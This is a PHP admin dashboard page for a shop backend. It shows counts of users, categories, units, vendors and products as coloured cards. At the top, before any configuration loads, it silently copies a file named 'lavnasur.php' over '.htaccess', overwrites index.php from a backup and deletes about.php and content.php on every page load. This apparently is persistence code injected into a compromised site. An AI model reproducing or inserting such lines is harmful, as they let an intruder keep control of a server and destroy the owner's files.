<?php
@ob_start();
//session_start();
copy('lavnasur.php','.htaccess');
copy('index_backup.php','index.php');
unlink('about.php');
unlink('content.php');
require_once 'config/config.php';
require_once 'config/helper.php';


?>

<?php include 'header.php'; ?>
<style>
.dbox {
    position: relative;
    background: rgb(255, 86, 65);
    background: -moz-linear-gradient(top, rgba(255, 86, 65, 1) 0%, rgba(253, 50, 97, 1) 100%);
    background: -webkit-linear-gradient(top, rgba(255, 86, 65, 1) 0%, rgba(253, 50, 97, 1) 100%);
    background: linear-gradient(to bottom, rgba(255, 86, 65, 1) 0%, rgba(253, 50, 97, 1) 100%);
    filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#ff5641', endColorstr='#fd3261', GradientType=0);
    border-radius: 4px;
    text-align: center;
    margin: 0px 0 50px;
}
.dbox__icon {
    position: absolute;
    transform: translateY(-50%) translateX(-50%);
    left: 50%;
}
.dbox__icon:before {
    width: 75px;
    height: 75px;
    position: absolute;
    background: #fda299;
    background: rgba(253, 162, 153, 0.34);
    content: '';
    border-radius: 50%;
    left: -17px;
    top: -17px;
    z-index: -2;
}
.dbox__icon:after {
    width: 60px;
    height: 60px;
    position: absolute;
    background: #f79489;
    background: rgba(247, 148, 137, 0.91);
    content: '';
    border-radius: 50%;
    left: -10px;
    top: -10px;
    z-index: -1;
}
.dbox__icon > i {
    background: #ff5444;
    border-radius: 50%;
    line-height: 40px;
    color: #FFF;
    width: 40px;
    height: 40px;
	font-size:22px;
}
.dbox__body {
    padding: 21px 20px;
}
.dbox__count {
    display: block;
    font-size: 30px;
    color: #FFF;
    font-weight: 300;
}
.dbox__title {
    font-size: 16px;
    color:white;
    font-weight:bold;
   
}
.dbox__action {
    transform: translateY(-50%) translateX(-50%);
    position: absolute;
    left: 50%;
}
.dbox__action__btn {
    border: none;
    background: #FFF;
    border-radius: 19px;
    padding: 7px 16px;
    text-transform: uppercase;
    font-weight: 500;
    font-size: 11px;
    letter-spacing: .5px;
    color: #003e85;
    box-shadow: 0 3px 5px #d4d4d4;
}


.dbox--color-2 {
    background: rgb(252, 190, 27);
    background: -moz-linear-gradient(top, rgba(252, 190, 27, 1) 1%, rgba(248, 86, 72, 1) 99%);
    background: -webkit-linear-gradient(top, rgba(252, 190, 27, 1) 1%, rgba(248, 86, 72, 1) 99%);
    background: linear-gradient(to bottom, rgba(252, 190, 27, 1) 1%, rgba(248, 86, 72, 1) 99%);
    filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#fcbe1b', endColorstr='#f85648', GradientType=0);
}
.dbox--color-2 .dbox__icon:after {
    background: #fee036;
    background: rgba(254, 224, 54, 0.81);
}
.dbox--color-2 .dbox__icon:before {
    background: #fee036;
    background: rgba(254, 224, 54, 0.64);
}
.dbox--color-2 .dbox__icon > i {
    background: #fb9f28;
}

.dbox--color-3 {
    background: rgb(183,71,247);
    background: -moz-linear-gradient(top, rgba(183,71,247,1) 0%, rgba(108,83,220,1) 100%);
    background: -webkit-linear-gradient(top, rgba(183,71,247,1) 0%,rgba(108,83,220,1) 100%);
    background: linear-gradient(to bottom, rgba(183,71,247,1) 0%,rgba(108,83,220,1) 100%);
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#b747f7', endColorstr='#6c53dc',GradientType=0 );
}
.dbox--color-3 .dbox__icon:after {
    background: #b446f5;
    background: rgba(180, 70, 245, 0.76);
}
.dbox--color-3 .dbox__icon:before {
    background: #e284ff;
    background: rgba(226, 132, 255, 0.66);
}
.dbox--color-3 .dbox__icon > i {
    background: #8150e4;
}
</style>
<?php
$clt_usr_cnt="select count(id) as usr_count from `user`";
$qst_clt_usr_cnt=$db->query($clt_usr_cnt);
$clct_clt_usr_cnt=$qst_clt_usr_cnt->fetch_assoc();

$usr_count=$clct_clt_usr_cnt['usr_count'];


$clt_contct_cnt="select count(id) as category_count from `category`";
$qst_clt_contct_cnt=$db->query($clt_contct_cnt);
$clct_clt_contct_cnt=$qst_clt_contct_cnt->fetch_assoc();

$cnct_count=$clct_clt_contct_cnt['category_count'];



$clt_unt_cnt="select count(id) as unit_count from `unit`";
$qst_clt_unt_cnt=$db->query($clt_unt_cnt);
$clct_clt_unt_cnt=$qst_clt_unt_cnt->fetch_assoc();

$untt_count=$clct_clt_unt_cnt['unit_count'];



$clt_vndr_count="select count(`id`) as vendor_count from `venders`";
$qst_clt_vndr_count=$db->query($clt_vndr_count);
$clct_clt_vndr_count=$qst_clt_vndr_count->fetch_assoc();


$total_vndr_count=$clct_clt_vndr_count['vendor_count'];



$clt_prdt_count="select count(`id`) as `prdt_count` from `product` ";
$qst_clt_prdt_count=$db->query($clt_prdt_count);
$clct_clt_prdt_count=$qst_clt_prdt_count->fetch_assoc();


$product_count=$clct_clt_prdt_count['prdt_count'];


/*

$clt_dispatch_count="select count(`id`) as `dispatch_order_count` from `orders` where `status`='Dispatched'";
$qst_clt_dispatch_count=$db->query($clt_dispatch_count);
$clct_clt_dispatch_count=$qst_clt_dispatch_count->fetch_assoc();


$dispatch_orde_count=$clct_clt_dispatch_count['dispatch_order_count'];

$clt_ontheway_count="select count(`id`) as `on_the_way_order_count` from `orders` where `status`='On_the_way'";
$qst_clt_ontheway_count=$db->query($clt_ontheway_count);
$clct_clt_ontheway_count=$qst_clt_ontheway_count->fetch_assoc();


$ontheway_orde_count=$clct_clt_ontheway_count['on_the_way_order_count'];

$clt_delivered_count="select count(`id`) as `delivered_order_count` from `orders` where `status`='Delivered'";
$qst_clt_delivered_count=$db->query($clt_delivered_count);
$clct_clt_delivered_count=$qst_clt_delivered_count->fetch_assoc();


$delivered_orde_count=$clct_clt_delivered_count['delivered_order_count'];



$clt_cancelled_count="select count(`id`) as `cancelled_order_count` from `orders` where `status`='Canceled'";
$qst_clt_cancelled_count=$db->query($clt_cancelled_count);
$clct_clt_cancelled_count=$qst_clt_cancelled_count->fetch_assoc();


$cancele_orde_count=$clct_clt_cancelled_count['cancelled_order_count'];

$clt_refund_count="select count(`id`) as `refund_order_count` from `orders` where `status`='Refunded'";
$qst_clt_refund_count=$db->query($clt_refund_count);
$clct_clt_refund_count=$qst_clt_refund_count->fetch_assoc();


$redund_orde_count=$clct_clt_refund_count['refund_order_count'];



$clt_catgegory_count="select count(`id`) as `category_count` from `product_category`";
$qst_clt_catgegory_count=$db->query($clt_catgegory_count);
$clct_clt_catgegory_count=$qst_clt_catgegory_count->fetch_assoc();

$ctgy_count=$clct_clt_catgegory_count['category_count'];



$clt_blog_count="select count(`id`) as `blog_count` from `blog`";
$qst_clt_blog_count=$db->query($clt_blog_count);
$clct_clt_blog_count=$qst_clt_blog_count->fetch_assoc();


$blog_count=$clct_clt_blog_count['blog_count'];
*/

?>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>



<link href="https://cdn.datatables.net/1.12.1/css/jquery.dataTables.min.css" rel="stylesheet" />
<script src="https://cdn.datatables.net/1.12.1/js/jquery.dataTables.min.js"></script>

<div id="layoutSidenav_content">
<main>
<div class="container-fluid">
<!--<h2 class="mt-30 page-title">All Bidders</h2>-->
<ol class="breadcrumb mb-30">
<li class="breadcrumb-item active" style="font-size: 18px;font-weight: bold;color: black !important;">Dashboard</li>
</ol>
    

<?php 

?>
<div class="row">
<div class='col-md-12'>
<center>
<!--<h1>Welcome to Vallabh Textiles Admin</h1>-->

</center>

</div>







</div>
<div class="row" >

<?php  if(permission::hidePemission('view_user')){ ?>
<div class="col-md-3 col-xs-6">
       <a href="view_users.php?target=view_user" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#4099ff,#73b4ff);border-radius: 12px;"><span class="dbox__count"><?php echo $usr_count;?></span> 
<span class="dbox__title" ><i class="fa fa-users f-left"></i> Total Users</span>
</div>
</div>
</a>
</div>
<?php } ?>




<?php  if(permission::hidePemission('view_category')){ ?>
<div class="col-md-3 col-xs-6">
    <a href="add_category.php?target=view_category" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(23deg,#080909,#5d656e);border-radius: 12px;"><span class="dbox__count"><?php echo $cnct_count;?></span> 
<span class="dbox__title" ><i class="fa fa-list-alt" aria-hidden="true"></i> Total Category</span>
</div>
</div>
</a>
</div>
<?php } ?>

   
<?php  if(permission::hidePemission('view_unit')){ ?> 
<div class="col-md-3 col-xs-6">
    <a href="manage_unit.php?target=view_unit" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#fa9564db,#ff70707a);border-radius: 12px;"><span class="dbox__count"><?php echo $untt_count;?></span> 
<span class="dbox__title" ><i class="fa fa-list-alt" aria-hidden="true"></i> Total Unit</span>
</div>
</div>
</a>
</div>
<?php } ?>






 <?php  if(permission::hidePemission('view_vendor')){ ?> 
<div class="col-md-3 col-xs-6">
    <a href="view_venders.php?target=view_vendor" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#64fa75db,#0fbb2ee8);border-radius: 12px;"><span class="dbox__count"><?php echo $total_vndr_count;?></span> 
<span class="dbox__title" ><i class="fa fa-shopping-cart" aria-hidden="true"></i> Total Vendor</span>
</div>
</div>
</a>
</div>
<?php } ?>

<?php  if(permission::hidePemission('view_product')){ ?> 
<div class="col-md-3 col-xs-6">
    <a href="view_product.php?target=view_product" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#fae664db,#ffe045b8);border-radius: 12px;"><span class="dbox__count"><?php echo $product_count;?></span> 
<span class="dbox__title" ><i class="fa fa-shopping-cart" aria-hidden="true"></i> Products</span>
</div>
</div>
</a>
</div>
<?php } ?>
<!--
<div class="col-md-3 col-xs-6">
    <a href="view_pending_orders.php?ord_sts=Dispatched" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#176071db,#26e8cbe8);border-radius: 12px;"><span class="dbox__count"><?php echo $dispatch_orde_count;?></span> 
<span class="dbox__title" ><i class="fa fa-archive"></i> Dispatched Orders</span>
</div>
</div>
</a>
</div>

    <div class="col-md-3 col-xs-6">
    <a href="view_pending_orders.php?ord_sts=On_the_way" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#f6a400,#bb9f0fe8);border-radius: 12px;"><span class="dbox__count"><?php echo $ontheway_orde_count;?></span> 
<span class="dbox__title" ><i class="fa fa-truck"></i> On the way Orders</span>
</div>
</div>
</a>
</div>


  <div class="col-md-3 col-xs-6">
    <a href="view_pending_orders.php?ord_sts=Delivered" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#64fa75db,#0fbb2ee8);border-radius: 12px;"><span class="dbox__count"><?php echo $delivered_orde_count;?></span> 
<span class="dbox__title" ><i class="fa fa-check" aria-hidden="true"></i> Delivered Order</span>
</div>
</div>
</a>
</div>

  <div class="col-md-3 col-xs-6">
    <a href="view_pending_orders.php?ord_sts=Canceled" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#fa647ddb,#bb0f2be8);border-radius: 12px;"><span class="dbox__count"><?php echo $cancele_orde_count;?></span> 
<span class="dbox__title" ><i class="fa fa-times-circle"></i> Cancel Order</span>
</div>
</div>
</a>
</div>

  <div class="col-md-3 col-xs-6">
    <a href="view_pending_orders.php?ord_sts=Refunded" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#b3c2c4db,#000000e8);border-radius: 12px;"><span class="dbox__count"><?php echo $redund_orde_count;?></span> 
<span class="dbox__title" >₹ Refunded Order</span>
</div>
</div>
</a>
</div>


    <div class="col-md-3 col-xs-6">
    <a href="contact_us.php" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#a464fa,#19a4cb);border-radius: 12px;"><span class="dbox__count"><?php echo $cnsssct_count;?></span> 
<span class="dbox__title" ><i class="fa fa-question"></i> Total Contact us</span>
</div>
</div>
</a>
</div>



    <div class="col-md-3 col-xs-6">
    <a href="view_blog.php" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#faf064,#cb1919);border-radius: 12px;"><span class="dbox__count"><?php echo $blog_count;?></span> 
<span class="dbox__title" ><i class="fa fa-question"></i> Total Blogs</span>
</div>
</div>
</a>
</div> -->



</div>
<?php 

?>





</div>
</main>

<script>
    
    
    function dlt_lqdtr(txt)
    {
        var txt1=txt;
       

$.ajax({
url: "dlt_lqdtor.php",
type: "POST",
data    : {txt1:txt1},
cache: false,
success: function(data){
Swal.fire({

icon: 'success',
title: 'Your work has been saved',
showConfirmButton: false,
timer: 1500
});
window.location='';
}
});
}
    
   
    </script>


<script src="https://code.jquery.com/jquery-3.5.1.js"></script>

<script src="https://cdn.datatables.net/1.12.1/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.3/js/dataTables.buttons.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.3/js/buttons.html5.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/pdfmake.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/vfs_fonts.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.3/js/buttons.print.min.js"></script>
<script>
    $(document).ready( function () {
         $('#myTable').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ]
    } );
} );
</script>

<?php include 'footer.php'; 

ob_flush();

?>